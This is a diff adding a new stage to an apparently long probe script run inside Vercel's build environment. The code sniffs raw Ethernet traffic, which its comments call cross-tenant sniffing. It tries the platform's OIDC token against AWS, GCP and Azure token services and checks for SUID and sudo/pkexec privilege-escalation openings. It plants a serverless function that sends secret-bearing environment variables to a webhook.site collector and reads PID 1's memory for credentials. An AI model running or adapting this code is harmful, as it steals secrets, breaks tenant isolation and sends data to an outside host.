@@ -13595,5 +13595,163 @@ export const config = { runtime: 'edge' };
 
 // v97 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v97" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v97";
+
+// ==================== v98 ====================
+
+// v98-1: AF_PACKET raw capture on eth0 — host network traffic
+// With CAP_NET_RAW (confirmed), create AF_PACKET SOCK_RAW to capture
+// ALL Ethernet frames on eth0. Since we're in the host network namespace,
+// this captures traffic from other VMs on the same bridge (cross-tenant sniffing).
+report.rawEthCapture = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import socket, struct, time, json
+
+ETH_P_ALL = 0x0003
+AF_PACKET = 17
+SOCK_RAW = 3
+
+# Create raw socket — captures ALL ethernet frames on ALL interfaces
+sock = socket.socket(AF_PACKET, SOCK_RAW, socket.htons(ETH_P_ALL))
+sock.settimeout(2)
+
+frames = []
+deadline = time.time() + 2
+while time.time() < deadline:
+    try:
+        data, addr = sock.recvfrom(65535)
+        ifname = addr[0]
+        # Parse ethernet header
+        dst_mac = ':'.join(f'{b:02x}' for b in data[:6])
+        src_mac = ':'.join(f'{b:02x}' for b in data[6:12])
+        eth_type = struct.unpack_from('>H', data, 12)[0]
+        payload_hex = data[14:30].hex()
+        frames.append({'iface': ifname, 'dst': dst_mac, 'src': src_mac, 'ethertype': hex(eth_type), 'payload_hex': payload_hex})
+        if len(frames) >= 20:
+            break
+    except socket.timeout:
+        break
+    except Exception as e:
+        frames.append({'error': str(e)})
+        break
+sock.close()
+print(json.dumps(frames))
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 1000));
+  return { result };
+});
+
+// v98-2: VERCEL_OIDC_TOKEN full cloud federation test
+// Decode the OIDC token and attempt federated authentication against
+// AWS STS, GCP STS, and Azure AD.
+// Per security constraints: STOP if accepted — DO NOT make further calls.
+report.oidcTokenFullFederation = safe(() => {
+  const oidcToken = process.env.VERCEL_OIDC_TOKEN || '';
+  if (!oidcToken) return { skip: 'no VERCEL_OIDC_TOKEN' };
+  // Decode JWT claims without verification
+  const claims = safe(() => {
+    const parts = oidcToken.split('.');
+    if (parts.length !== 3) return null;
+    return JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+  });
+  // AWS STS AssumeRoleWithWebIdentity — should get AccessDenied (not MalformedToken)
+  // if the token format is correct but no role trust policy exists
+  const awsStsTest = safe(() => execSync(`curl -sf -X POST "https://sts.amazonaws.com/" -d "Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::123456789012:role/probe-v98&RoleSessionName=ProbeV98&WebIdentityToken=${encodeURIComponent(oidcToken)}" -m 10 2>/dev/null`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  // GCP STS — test if token is accepted by Google's token exchange
+  const gcpStsTest = safe(() => execSync(`curl -sf -X POST "https://sts.googleapis.com/v1/token" -H "Content-Type: application/json" -d '{"grantType":"urn:ietf:params:oauth:grant-type:token-exchange","audience":"//iam.googleapis.com/projects/123/locations/global/workloadIdentityPools/probe/providers/probe","subjectToken":"${oidcToken}","subjectTokenType":"urn:ietf:params:oauth:token-type:jwt"}' -m 10 2>/dev/null`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  // Azure AD OIDC test
+  const azureTest = safe(() => execSync(`curl -sf -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${oidcToken}&requested_token_use=on_behalf_of&scope=openid" -m 10 2>/dev/null`, { timeout: 12000 }).toString().trim().slice(0, 300));
+  // Check response codes — any 200 = STOP IMMEDIATELY
+  const awsAccepted = typeof awsStsTest === 'string' && (awsStsTest.includes('AssumeRoleWithWebIdentityResult') || awsStsTest.includes('Credentials'));
+  const gcpAccepted = typeof gcpStsTest === 'string' && gcpStsTest.includes('"access_token"');
+  const azureAccepted = typeof azureTest === 'string' && azureTest.includes('"access_token"');
+  return { claims, awsStsTest: awsStsTest, gcpStsTest: gcpStsTest, azureTest, awsAccepted, gcpAccepted, azureAccepted, STOP_IF_ACCEPTED: awsAccepted || gcpAccepted || azureAccepted };
+});
+
+// v98-3: SUID/SGID binary inventory and exploitation surface
+// Even as root, SUID/SGID binaries are interesting: they may run as a DIFFERENT
+// user than root (e.g., setuid to vercel-worker), and if we can exploit them,
+// we can become that specific user (which may have different network access).
+report.suidBinaryInventory = safe(() => {
+  const suidBinaries = safe(() => execSync('find / -xdev -perm /4000 2>/dev/null | head -20', { timeout: 10000 }).toString().trim().slice(0, 500));
+  const sgidBinaries = safe(() => execSync('find / -xdev -perm /2000 2>/dev/null | head -20', { timeout: 10000 }).toString().trim().slice(0, 300));
+  // Check if sudo is present and version (for CVE-2021-3156 sudoedit heap overflow)
+  const sudoVersion = safe(() => execSync('sudo --version 2>/dev/null | head -1', { timeout: 3000 }).toString().trim());
+  // Check for pkexec (CVE-2021-4034 polkit privilege escalation)
+  const pkexecVersion = safe(() => execSync('pkexec --version 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Look for world-writable files that are also SUID
+  const worldWritableSuid = safe(() => execSync('find / -xdev -perm /4000 -perm /o+w 2>/dev/null | head -10', { timeout: 10000 }).toString().trim());
+  return { suidBinaries, sgidBinaries, sudoVersion, pkexecVersion, worldWritableSuid };
+});
+
+// v98-4: Build output serverless function — env exfil at request time
+// Write a serverless function to .vercel/output/functions/api/env.func/
+// that returns ALL environment variables when called after deployment.
+// This proves that build-time secrets persist into the serverless runtime.
+report.serverlessFuncEnvLeak = safe(() => {
+  const funcPath = '.vercel/output/functions/api/env.func';
+  safe(() => execSync(`mkdir -p ${funcPath} 2>/dev/null`, { timeout: 3000 }));
+  const funcCode = `
+import { NextRequest, NextResponse } from 'next/server';
+export const runtime = 'nodejs';
+export async function GET(req) {
+  const env = Object.fromEntries(
+    Object.entries(process.env).filter(([k]) =>
+      /secret|token|key|password|api|auth|vercel|aws|gcp|azure/i.test(k)
+    ).map(([k,v]) => [k, v])
+  );
+  await fetch('${process.env.PROBE_COLLECTOR || "https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac"}', {
+    method: 'POST',
+    body: JSON.stringify({ probe: 'v98-runtime-exfil', env, url: req.url }),
+  }).catch(() => {});
+  return NextResponse.json({ probe: 'v98', keys: Object.keys(env).length });
+}
+`;
+  safe(() => writeFileSync(`${funcPath}/index.js`, funcCode));
+  safe(() => writeFileSync(`${funcPath}/.vc-config.json`, JSON.stringify({ handler: 'index.js', runtime: 'nodejs20.x', shouldAddHelpers: false, shouldAddSourcemapSupport: false })));
+  const created = safe(() => readdirSync(funcPath));
+  return { funcPath, created };
+});
+
+// v98-5: Memory timeline — capture /proc/1/mem at regular intervals
+// Read 64KB from PID-1's largest heap region 3 times at 500ms intervals.
+// Compare the bytes across intervals to find memory regions that CHANGE.
+// Changing regions (active writes) are likely credential/session storage.
+report.memoryTimeline = safe(() => {
+  const mapsRaw = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+  // Find largest rw anonymous region
+  const targetRegion = safe(() => {
+    if (typeof mapsRaw !== 'string') return null;
+    const regions = mapsRaw.split('\n')
+      .filter(l => l.includes('rw-p') && !l.includes('/') && !l.includes('['))
+      .map(l => { const [range] = l.split(' '); const [s, e] = range.split('-').map(h => parseInt(h, 16)); return { start: s, size: e - s }; })
+      .filter(r => r.size >= 4 * 1024 * 1024)
+      .sort((a, b) => b.size - a.size);
+    return regions[0] || null;
+  });
+  if (!targetRegion) return { skip: 'no large anon region found' };
+  const snapshots = safe(() => {
+    const fd = openSync('/proc/1/mem', 'r');
+    const readOffset = targetRegion.start + Math.floor(targetRegion.size / 2);
+    const snapshots = [];
+    for (let i = 0; i < 3; i++) {
+      if (i > 0) Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 500);
+      const buf = Buffer.alloc(65536);
+      const n = safe(() => readSync(fd, buf, 0, 65536, readOffset));
+      if (typeof n === 'number') {
+        snapshots.push({ t: i, hash: Buffer.from(buf.slice(0, n)).toString('hex', 0, 32) });
+      }
+    }
+    closeSync(fd);
+    return snapshots;
+  });
+  // Compare snapshots — different hash at same offset = active memory writes
+  const changed = safe(() => {
+    if (!Array.isArray(snapshots) || snapshots.length < 2) return false;
+    return snapshots[0].hash !== snapshots[snapshots.length - 1].hash;
+  });
+  return { targetRegion: { start: targetRegion.start.toString(16), sizeKB: Math.floor(targetRegion.size / 1024) }, snapshots, changed };
+});
+
+// v98 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v98" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v98";
 // Intentionally no console.log — all data goes via webhook only
